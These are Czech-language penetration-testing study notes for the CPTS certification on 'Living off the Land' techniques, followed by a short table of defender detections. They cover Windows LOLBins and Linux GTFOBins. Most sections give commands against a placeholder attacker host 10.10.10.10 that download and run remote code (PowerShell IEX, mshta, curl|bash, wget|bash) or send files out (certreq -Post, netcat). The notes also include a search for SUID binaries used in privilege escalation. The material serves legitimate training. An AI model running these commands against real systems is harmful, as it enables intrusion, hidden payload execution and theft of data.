# 🏗️ Living off the Land – CPTS Doplnění

## Princip

**Living off the Land (LotL)** znamená využití nástrojů, které už existují v cílovém systému.

Výhody:

- není nutné uploadovat vlastní nástroje
- méně podezřelé než vlastní malware
- často obejde omezení firewallu
- využívá administrátorem povolené aplikace

---

# 🪟 Windows LOLBins

## 1. Certutil.exe

Lokace:

```
C:\Windows\System32\certutil.exe
```

### Download souboru

```
certutil.exe -urlcache -split -f http://10.10.10.10/file.exe file.exe
```

Použití:

- download
- Base64 encode/decode
- hashování

### Base64

Encode:

```
certutil -encode file.txt encoded.txt
```

Decode:

```
certutil -decode encoded.txt file.txt
```

---

# 2. PowerShell

Jeden z nejdůležitějších LOLBins.

## Download

```
iwr http://10.10.10.10/file.exe -OutFile file.exe
```

nebo:

```
(New-Object Net.WebClient).DownloadFile(
"http://10.10.10.10/file.exe",
"file.exe")
```

## Execution v paměti

```
IEX(New-Object Net.WebClient).DownloadString(
"http://10.10.10.10/script.ps1")
```

---

# 3. Mshta.exe

Spouštění HTA aplikací.

Lokace:

```
C:\Windows\System32\mshta.exe
```

Příklad:

```
mshta http://10.10.10.10/payload.hta
```

Často zneužíváno pro:

- script execution
- bypass některých omezení

---

# 4. Rundll32.exe

Normálně spouští DLL knihovny.

Příklad:

```
rundll32.exe example.dll,EntryPoint
```

Použití:

- DLL execution
- proxy execution

---

# 5. Regsvcs / Regasm

.NET binárky:

```
regsvcs.exe payload.dll
```

nebo:

```
regasm.exe payload.dll
```

Použití:

- spouštění .NET assembly
- obcházení některých kontrol

---

# 6. MSBuild.exe

Legitimní .NET build nástroj.

```
MSBuild.exe project.xml
```

Může spustit kód obsažený v XML projektu.

---

# 7. BITSAdmin

BITS = Background Intelligent Transfer Service

Download:

```
bitsadmin /transfer job ^
http://10.10.10.10/file.exe ^
C:\Temp\file.exe
```

PowerShell:

```
Start-BitsTransfer `
-Source http://10.10.10.10/file.exe `
-Destination C:\Temp\file.exe
```

---

# 8. certreq.exe

Méně známý LOLBin.

Použití:

- práce s certifikáty
- HTTP komunikace

Příklad:

```
certreq.exe -Post http://10.10.10.10/upload file.txt
```

---

# 🐧 Linux GTFOBins

## 1. curl

Download:

```
curl http://10.10.10.10/file -o file
```

Execution:

```
curl http://10.10.10.10/script.sh | bash
```

---

# 2. wget

Download:

```
wget http://10.10.10.10/file
```

Execution:

```
wget -qO- http://10.10.10.10/script.sh | bash
```

---

# 3. OpenSSL

Šifrovaný přenos:

Server:

```
openssl s_server \
-quiet \
-accept 443 \
-cert cert.pem \
-key key.pem < file
```

Klient:

```
openssl s_client \
-connect 10.10.10.10:443 \
-quiet > file
```

---

# 4. Python

HTTP server:

```
python3 -m http.server 8000
```

Download:

```
python3 -c '
import urllib.request;
urllib.request.urlretrieve(
"http://10.10.10.10/file",
"file")
'
```

---

# 5. Netcat

Upload:

Server:

```
nc -lvnp 4444 > file
```

Klient:

```
nc 10.10.10.10 4444 < file
```

---

# 6. SCP

Pokud existují SSH credentials:

```
scp file user@host:/tmp/
```

---

# 7. SUID GTFOBins

Velmi důležité pro privilege escalation.

Najdi SUID:

```
find / -perm -4000 2>/dev/null
```

Příklad:

```
-rwsr-xr-x root root /usr/bin/python3
```

Python se SUID může znamenat:

- root shell
- čtení chráněných souborů

---

# 🔎 Hledání dostupných nástrojů

## Linux

```
which curl
which wget
which python
which nc
which openssl
```

---

## Windows

```
where certutil
where powershell
where bitsadmin
where curl
```

---

# 🛡️ Defense pohled (CPTS)

Obránci sledují hlavně:

|Aktivita|Detekce|
|---|---|
|certutil download|Sysmon Event ID 1|
|PowerShell IEX|AMSI|
|mshta HTTP request|EDR|
|rundll32 neobvyklé DLL|Process monitoring|
|wget/curl z serveru|Network monitoring|

---

# 🎯 CPTS Living off the Land Checklist

```
Windows:

[ ] powershell
[ ] certutil
[ ] bitsadmin
[ ] mshta
[ ] rundll32
[ ] regsvcs
[ ] msbuild
[ ] certreq


Linux:

[ ] curl
[ ] wget
[ ] python
[ ] php
[ ] perl
[ ] ruby
[ ] openssl
[ ] nc


Privilege Escalation:

[ ] SUID soubory
[ ] sudo -l
[ ] capabilities
[ ] cron jobs
[ ] systemd služby
```